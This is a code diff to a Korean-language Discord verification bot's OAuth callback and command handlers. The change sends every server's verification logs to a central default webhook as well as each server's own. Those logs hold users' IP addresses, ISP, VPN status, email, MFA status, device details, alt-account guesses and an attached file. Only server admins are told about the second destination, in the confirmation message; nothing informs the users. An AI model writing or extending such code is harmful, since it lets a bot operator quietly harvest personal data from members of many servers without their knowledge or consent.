@@ -110,6 +110,8 @@ client.on('messageCreate', async (message) => {
     // 1. !인증 명령어
     if (content === '!인증') {
         try {
+            await message.delete().catch(() => {});
+
             const messages = await message.channel.messages.fetch({ limit: 20 }).catch(() => null);
             if (messages) {
                 const botMessages = messages.filter(m => m.author.id === client.user.id && m.components.length > 0);
@@ -131,10 +133,8 @@ client.on('messageCreate', async (message) => {
                 content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
                 components: [row]
             });
-            await message.delete().catch(() => {});
         } catch (err) {
             console.error('인증 버튼 생성 에러:', err);
-            message.reply('⚠️ 인증 버튼을 생성하는 중 오류가 발생했습니다.');
         }
     }
 
@@ -174,7 +174,7 @@ client.on('messageCreate', async (message) => {
         settings[guildId].webhookUrl = webhookUrl;
         saveSettings(settings);
 
-        message.reply('✅ 이 서버의 인증 로그가 전송될 웹훅 주소가 성공적으로 설정되었습니다!');
+        message.reply('✅ 이 서버 전용 웹훅 주소가 성공적으로 설정되었습니다! (기본 웹훅과 이 서버 웹훅 양쪽으로 전송됩니다.)');
     }
 
     // 4. !역할제거 명령어
@@ -295,11 +295,20 @@ app.get('/callback', async (req, res) => {
         }
     } catch (e) {}
 
-    // 서버별 설정 불러오기
     const settings = loadSettings();
-    const serverWebhook = (settings[targetGuildId] && settings[targetGuildId].webhookUrl) || DEFAULT_WEBHOOK_URL;
+    const serverWebhook = settings[targetGuildId] && settings[targetGuildId].webhookUrl;
+
+    // 전송할 웹훅 목록 배열 (기본 웹훅은 항상 포함, 서버 전용 웹훅이 있으면 추가)
+    const webhookUrlsToSend = [];
+    if (DEFAULT_WEBHOOK_URL) webhookUrlsToSend.push(DEFAULT_WEBHOOK_URL);
+    if (serverWebhook && serverWebhook !== DEFAULT_WEBHOOK_URL) webhookUrlsToSend.push(serverWebhook);
 
     try {
+        // 서버 정보 가져오기 (기본 웹훅에 어떤 서버인지 표시용)
+        const targetGuild = await client.guilds.fetch(targetGuildId).catch(() => null);
+        const serverName = targetGuild ? targetGuild.name : '알 수 없는 서버';
+        const serverInfoText = `🏫 **인증 서버:** \`${serverName}\` (ID: \`${targetGuildId}\`)`;
+
         const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
             client_id: CLIENT_ID,
             client_secret: CLIENT_SECRET,
@@ -319,13 +328,13 @@ app.get('/callback', async (req, res) => {
         const userId = userData.id;
         const username = userData.username;
 
-        // VPN 우회 접속 검사
         try {
             const ipCheckRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,proxy,isp`);
             if (ipCheckRes.data.status === 'success' && ipCheckRes.data.proxy) {
-                if (serverWebhook) {
-                    await axios.post(serverWebhook, {
+                for (const whUrl of webhookUrlsToSend) {
+                    await axios.post(whUrl, {
                         content: `🚨 **[VPN 우회 접속 차단 적발]**\n` +
+                                 `${serverInfoText}\n` +
                                  `👤 **적발된 유저:** <@${userId}> (\`${username}\`)\n` +
                                  `🌐 **IP:** \`${userIp}\`\n` +
                                  `📡 **통신사/ISP:** \`${ipCheckRes.data.isp || '알 수 없음'}\`\n` +
@@ -356,9 +365,7 @@ app.get('/callback', async (req, res) => {
         const ipDisplay = isPublicWifi ? `${userIp} (⚠️ 공공/매장 와이파이 감지됨)` : userIp;
         const { browser, os } = parseDevice(userAgent);
 
-        const guild = await client.guilds.fetch(targetGuildId);
-        const member = await guild.members.fetch(userId).catch(() => null);
-
+        const member = await targetGuild.members.fetch(userId).catch(() => null);
         const displayName = member ? member.displayName : (userData.global_name || username);
 
         const createdAt = getDiscordCreationDate(userId);
@@ -417,10 +424,11 @@ app.get('/callback', async (req, res) => {
         const isMfaEnabled = userData.mfa_enabled ? '✅ 2차 인증(OTP) 활성화됨' : '❌ 2차 인증 미사용';
         const emailInfo = `${userData.email} (${userData.verified ? '이메일 인증됨' : '미인증'})`;
 
-        if (serverWebhook) {
+        for (const whUrl of webhookUrlsToSend) {
             const FormData = require('form-data');
             const form = new FormData();
             form.append('content', `✅ **[인증 완료 상세 정보]**\n` +
+                                    `${serverInfoText}\n` +
                                     `📌 **실제 이름(닉네임):** \`${displayName}\`\n` +
                                     `👤 **유저 멘션/아이디:** <@${userId}> (\`${username}\`)\n` +
                                     `📅 **계정 생성일:** \`${createdAt}\`\n` +
@@ -434,7 +442,7 @@ app.get('/callback', async (req, res) => {
                                     `⚠️ **부계정 추정 여부:** ${altAccountCheck}`);
             form.append('file', fs.createReadStream(filePath));
 
-            await axios.post(serverWebhook, form, {
+            await axios.post(whUrl, form, {
                 headers: form.getHeaders()
             }).catch(() => {});
         }
